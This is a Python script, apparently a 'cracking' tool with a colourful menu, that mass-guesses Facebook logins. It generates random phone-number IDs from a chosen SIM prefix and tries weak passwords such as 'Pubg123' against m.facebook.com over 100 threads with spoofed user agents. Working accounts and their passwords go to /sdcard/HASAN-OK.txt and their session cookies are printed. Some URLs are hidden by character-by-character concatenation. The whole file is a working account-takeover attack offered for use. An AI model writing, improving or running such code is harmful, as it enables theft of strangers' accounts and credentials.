#------------Moduls------------#
import os,sys,time,json,random,re,string,platform,base64,uuid,rich
from rich import print as asraf
from rich.progress import track
from rich.tree import Tree
from rich.panel import Panel
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
from time import localtime as lt
from os import system as cmd
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    __Nodi__ = os.system
k=Panel('\t[bold green] '+'C'+'H'+'O'+'I'+'C'+'E'+' : '+'0'+'1'+'3'+' 0'+'1'+'9'+' 0'+'1'+'7'+' 0'+'1'+'5'+' 0'+'1'+'6'+' 0'+'1'+'4'+' 0'+'1'+'8')
o=Panel('     [bold cyan1][[bold bright_magenta]A[bold cyan1]][bold sea_green2] mbasic [cyan1][[bright_magenta]B[cyan1]][bold sea_green2] Free [cyan1][[bold bright_magenta]C[cyan1]][bold sea_green2] m [cyan1][[bold bright_magenta]D[cyan1]][bold sea_green2] p [cyan1][[bold bright_magenta]E[cyan1]][bold sea_green2] x [cyan1][[bold bright_magenta]F[cyan1]][bold sea_green2] web',title='[bold magenta1][[bold red3]CHOICE [bold deep_pink3]METHOD[magenta1]]')
#-----------Box Ai ------------#
i=Panel('\t   [bold sea_green2]T[bold sea_green2]O[bold sea_green2]O[bold sea_green2]L[bold sea_green2]S[bold sea_green2] C[bold sea_green2]R[bold sea_green2]E[bold sea_green2]A[bold sea_green2]T[bold sea_green2]E [bold sea_green2]B[bold sea_green2]Y [bold sea_green2]A[bold sea_green2]S[bold sea_green2]R[bold sea_green2]A[bold sea_green2]F[bold sea_green2]U[bold sea_green2]L[bold sea_green2] I[bold sea_green2]S[bold sea_green2]L[bold sea_green2]A[bold sea_green2]M[bold sea_green2] H[bold sea_green2]A[bold sea_green2]S[bold sea_green2]A[bold sea_green2]N[bold sea_green2]')
M=Panel(' [cyan1][[bright_magenta]A[cyan1]][sea_green2] '+'[sea_green2]R'+'[sea_green2]4'+'[sea_green2]N'+'[sea_green2]D'+'[sea_green2]O'+'[sea_green2]M'+' [sea_green2]C'+'[sea_green2]L'+'[sea_green2]O'+'[sea_green2]N'+'[sea_green2]E [cyan1][[bright_magenta]B[cyan1]][sea_green2] '+'[sea_green2]T'+'[sea_green2]L'+' [sea_green2]R'+'[sea_green2]E'+'[sea_green2]P'+'[sea_green2]O'+'[sea_green2]R'+'[sea_green2]T [cyan1][[bright_magenta]C[cyan1]][sea_green2] '+'[sea_green2]C'+'[sea_green2]O'+'[sea_green2]N'+'[sea_green2]T'+'[sea_green2]A'+'[sea_green2]C'+'[sea_green2]T'+' I[sea_green2]'+'[sea_green2]N'+'[sea_green2]F'+'[sea_green2]O'+'  [cyan1][[bright_magenta]0[cyan1]][sea_green2] '+'[sea_green2]E'+'[sea_green2]X'+'[sea_green2]I'+'[sea_green2]T',title='[magenta1][[red3]'+'[red3]C'+'[red3]H'+'[red3]O'+'[red3]I'+'[red3]C'+'[red3]E'+' [deep_pink3]'+'B'+'[deep_pink3]O'+'[deep_pink3]X'+'[magenta1]]')
I=Panel(' [cyan1][[bright_magenta]A[cyan1]][sea_green2] '+'F'+'A'+'C'+'E'+'B'+'O'+'O'+'K'+' I'+'D'+' [cyan1][[bright_magenta]B[cyan1]][sea_green2] '+'F'+'A'+'C'+'E'+'B'+'O'+'O'+'K'+' P'+'G'+' [cyan1][[bright_magenta]C[cyan1]][sea_green2] '+'F'+'A'+'C'+'E'+'B'+'O'+'O'+'K'+' G'+'P'+'  [cyan1][[bright_magenta]0[cyan1]][sea_green2]'+'B'+'A'+'C'+'K',title='[magenta1][[red3]'+'I'+'N'+'F'+'O'+' [deep_pink3]'+'B'+'O'+'X'+'[magenta1]]')
C=Panel('\t\t[cyan1][ [sea_green2]'+'C'+'R'+'A'+'C'+'K'+'I'+'N'+'G'+' C'+'O'+'M'+'P'+'L'+'E'+'T'+'E'+' B'+'R'+'O'+'[cyan1] ]')
#------------Loop Box------------#
id = [];user = [];oks = [];cps = [];loop = 0;ugen=[];hasan = []
#----------------User Agent----------#
for xd in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='RMX3191 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome'
    d=random.randrange(10,200)
    e='0.4844.88 '
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/383.1.0.25.106;]'
    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)
for xd in range(9000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='CPH2269 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/348.0.0.8.103;]'
    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)
for xd in range(10000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      tamanna=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(tamanna)
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8','9','10','11','12','13','14','15'])
	c='itel S661LP Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	asraful11=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(asraful11)
logo = ("""[green]
           ██   ██  █████  ███████  █████  ███    ██
           ██   ██ ██   ██ ██      ██   ██ ████   ██
           ███████ ███████ ███████ ███████ ██ ██  ██
           ██   ██ ██   ██      ██ ██   ██ ██  ██ ██
           ██   ██ ██   ██ ███████ ██   ██ ██   ████  """)
def clear():
	os.system('clear')
def main():
	clear();asraf(logo);asraf(i);asraf(M)
	hasan23=input('  Choice : ')
	if hasan23 in ['1','01','a','A']:tyrin()
	if hasan23 in ['2','02','b','B']:os.system('x'+'d'+'g'+'-'+'o'+'p'+'e'+'n h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'w'+'w'+'w'+'.'+'f'+'a'+'c'+'e'+'b'+'o'+'o'+'k'+'.'+'c'+'o'+'m'+'/'+'p'+'r'+'o'+'f'+'i'+'l'+'e'+'.'+'p'+'h'+'p'+'?'+'i'+'d'+'='+'1'+'0'+'0'+'0'+'9'+'0'+'7'+'4'+'0'+'7'+'7'+'9'+'8'+'1'+'2')
	if hasan23 in ['3','03','c','C']:info()
	else:
		exit()
		
def info():
	clear();asraf(logo);asraf(i);asraf(I)
	inf=input('  Choice Option: ')
	if inf in ['1','01','a','A']:os.system('x'+'d'+'g'+'-'+'o'+'p'+'e'+'n h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'w'+'w'+'w'+'.'+'f'+'a'+'c'+'e'+'b'+'o'+'o'+'k'+'.'+'c'+'o'+'m'+'/'+'c'+'o'+'p'+'y'+'.'+'l'+'i'+'n'+'k'+'.'+'e'+'r'+'o'+'r'+'r'+'4'+'0'+'4');main()
	if inf in ['2','02','B','b']:os.system('x'+'d'+'g'+'-'+'o'+'p'+'e'+'n h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'w'+'w'+'w'+'.'+'f'+'a'+'c'+'e'+'b'+'o'+'o'+'k'+'.'+'c'+'o'+'m'+'/'+'p'+'r'+'o'+'f'+'i'+'l'+'e'+'.'+'p'+'h'+'p'+'?'+'i'+'d'+'='+'1'+'0'+'0'+'0'+'9'+'0'+'7'+'4'+'0'+'7'+'7'+'9'+'8'+'1'+'2');main()
	if inf in ['3','03','c','C']:os.system('x'+'d'+'g'+'-'+'o'+'p'+'e'+'n h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'f'+'a'+'c'+'e'+'b'+'o'+'o'+'k'+'.'+'c'+'o'+'m'+'/'+'g'+'r'+'o'+'u'+'p'+'s'+'/'+'5'+'5'+'1'+'3'+'6'+'5'+'7'+'5'+'6'+'7'+'5'+'8'+'4'+'8'+'7'+'/');main()
	if inf in ['0','00','e','E']:main()
#------------Main Def------------#
def tyrin():
    user=[]
    global hasan
    os.getuid
    os.geteuid
    clear();asraf(logo);asraf(i);asraf(k)
    code = input('  SIM CODE : ')
    clear();asraf(logo);asraf(i);asraf(h)
    limit=int(input("  CRACKING LIMIT : "))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=100) as Hasan_Vai:
        tl = str(len(user))
        clear();asraf(logo);asraf(i)
        asraf(Panel(f'\t\t[bold green]YOUR SIM CODE : '+code))
        asraf(Panel(f'\t\t[bold green]CRACKING LIMIT: '+tl))
        for love in user:
            pwx = [love,love[2:],code+love[:3],'FreeFire','Pubg123','TikTok','Alh4aj']
            uid = code+love
            Hasan_Vai.submit(nodi,uid,pwx,tl)

    asraf(C)
h=Panel('\t\t[bold green] '+'C'+'H'+'O'+'I'+'C'+'E'+' : '+'2'+'0'+'0'+'0'+' /'+' 5'+'0'+'0'+'0'+' /'+' 1'+'0'+'0'+'0'+'0')

def nodi(uid,pwx,tl):
    global loop
    global cps
    global oks
    global agents
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r  \033[1;91m[\033[1;92mCRACKING\033[1;91m][\033[1;92m%s\033[1;91m] \033[1;91m[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'm.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://m.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?0',
            "pragma": 'no-cache',
            "priority": 'u=0',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": pro,}
            lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                asraf(f' [white]~ [red3][[bold bright_yellow]IM OK ACCOUNT💚[red3]][bright_yellow]-> [bold bright_green]'+uid+' = '+ps+'')
                asraf(f' [white]~ [red3][[bold bright_yellow]IM COOKIE💜[red3]][bright_yellow]-> [bold bright_green]'+coki)
                open('/sdcard/HASAN-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                asraf('[red3] ~ [IM CP ACCOUNT💔]-> '+uid+' = '+ps+' ')
                open('/sdcard/SORRY-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
    except:
        pass
 
main()